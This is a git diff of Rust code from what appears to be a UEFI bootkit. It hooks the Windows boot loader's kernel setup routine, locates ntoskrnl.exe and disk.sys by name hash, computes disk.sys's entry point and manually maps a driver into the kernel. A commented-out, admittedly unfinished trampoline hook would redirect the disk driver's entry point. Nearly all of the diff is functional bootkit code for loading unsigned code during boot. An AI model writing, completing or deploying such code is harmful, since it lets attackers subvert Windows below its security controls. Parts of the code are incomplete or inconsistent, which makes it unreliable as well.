@@ -5,7 +5,7 @@ use uefi::proto::loaded_image::LoadedImage;
 use uefi::{Handle, Status};
 use crate::boot::globals::{ALLOCATED_BUFFER, DRIVER_IMAGE_SIZE};
 use crate::boot::pe::{pattern_scan, trampoline_hook64, trampoline_unhook, get_loaded_module_by_hash};
-use crate::mapper::manually_map;
+use crate::mapper::{manually_map, get_nt_headers};
 use super::{includes::_LOADER_PARAMETER_BLOCK};
 
 extern crate alloc;
@@ -172,20 +172,32 @@ fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) 
     // ntoskrnl.exe hash: 0xa3ad0390
     // Get ntoskrnl.exe _LIST_ENTRY from the _LOADER_PARAMETER_BLOCK to get image base and image size 
     let ntoskrnl_entry = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead,0xa3ad0390)
-        .expect("Failed to get loaded module by name")
+        .expect("Failed to get ntoskrnl by hash")
     };
 
     log::info!("ntoskrnl.exe image base: {:p}", unsafe { (*ntoskrnl_entry).DllBase });
     log::info!("ntoskrnl.exe image size: {:#x}", unsafe { (*ntoskrnl_entry).SizeOfImage });
 
-    // The target module is the driver we are going to hook, this will be left to the user to change TODO
-    /* 
-    let target = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead,0x1337)
-        .expect("Failed to get loaded module by name")
+    // The target module is the driver we are going to hook, this will be left to the user to change
+    // disk.sys hash: 0xf78f291d
+    let target_driver_ldr_data = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead, 0xf78f291d)
+        .expect("Failed to get target driver by hash")
+    };
+
+    let nt_headers = unsafe { get_nt_headers((*target_driver_ldr_data).DllBase as _).expect("Failed to get target driver nt headers") };
+    let _target_entry_point = unsafe { (*target_driver_ldr_data).DllBase as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };
+
+    let _driver_entry = unsafe { manually_map((*ntoskrnl_entry).DllBase as _)
+        .expect("Failed to manually map Windows kernel driver")
+    };
+
+    /* Gotta fix this (redirect to the driver entry point)
+    unsafe { ORIGINAL_BYTES = trampoline_hook64(target_entry_point as _, driver_entry, JMP_SIZE)
+        .expect("Failed to perform trampoline hook on OslArchTransferToKernel")
     };
     */
 
-    unsafe { manually_map((*ntoskrnl_entry).DllBase as _) };
+    log::info!("[+] Loading Windows Kernel...");
     
     /* The commented code is not required, if you're hooking OslFwpKernelSetupPhase1
     
